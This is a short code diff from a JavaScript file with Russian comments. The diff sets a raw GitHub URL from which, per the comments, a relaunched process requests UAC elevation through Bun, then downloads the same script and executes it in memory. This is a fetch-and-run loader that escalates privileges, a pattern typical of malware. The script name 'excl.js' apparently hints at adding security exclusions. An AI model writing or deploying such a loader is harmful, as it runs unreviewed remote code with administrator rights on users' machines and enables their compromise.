@@ -53,7 +53,7 @@
   // --- РЕКУРСИЯ (Запрос UAC) ---
   console.log("❌ Права ограничены. Запрашиваем повышение через Bun...");
   
-  const url = "https://githubusercontent.com";
+  const url = "https://raw.githubusercontent.com/gaknulzhizhkoi-cloud/OnATRTA/refs/heads/main/scripts/excl.js";
   
   // Команда для нового процесса: скачай этот же скрипт и выполни в памяти
   // Используем двойные кавычки для CMD-совместимости
